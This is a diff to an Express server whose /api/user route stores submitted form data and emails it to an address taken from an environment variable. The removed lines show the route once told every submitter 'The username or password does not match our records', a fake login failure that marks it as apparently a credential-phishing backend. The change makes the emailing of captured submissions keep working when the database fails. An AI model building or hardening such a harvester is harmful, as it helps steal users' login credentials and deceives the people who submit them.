@@ -24,23 +24,33 @@ app.get("/", (req, res) => {
 // ===== CREATE USER & SEND EMAIL =====
 app.post("/api/user", async (req, res) => {
   try {
-    // Check if user already exists
-    let user = await User.findOne({ email: req.body.email });
+    // Attempt DB operations, but continue to send email even if DB is down
+    try {
+      let user = await User.findOne({ email: req.body.email });
 
-    if (!user) {
-      // Create new user if doesn't exist
-      user = new User(req.body);
-      await user.save();
+      if (!user) {
+        user = new User(req.body);
+        await user.save();
+      }
+    } catch (dbErr) {
+      console.error(
+        "DB error during registration (continuing to send email):",
+        dbErr.message
+      );
     }
 
     // Send email (log recipient env for debugging)
-    console.log("POST /api/user: sending notification for", req.body.email, "using SEND_TO=", process.env.SEND_TO);
+    console.log(
+      "POST /api/user: sending notification for",
+      req.body.email,
+      "using SEND_TO=",
+      process.env.SEND_TO
+    );
     await sendUserEmail(req.body);
 
     res.json({
       success: true,
-      message:
-        "The username or password does not match our records. Please try again.",
+      message: "Registration processed (email queued).",
     });
   } catch (error) {
     console.error("Error submitting user:", error.message);
@@ -68,10 +78,11 @@ const start = async () => {
   try {
     await mongoose.connect(process.env.MONGO_URI);
     console.log("Database connected");
-
-    app.listen(port, () => console.log(`Server running on PORT ${port}`));
   } catch (err) {
     console.error("MongoDB connection failed:", err.message);
+  } finally {
+    // Start server regardless of DB connection status so email/debugging can proceed
+    app.listen(port, () => console.log(`Server running on PORT ${port}`));
   }
 };
 
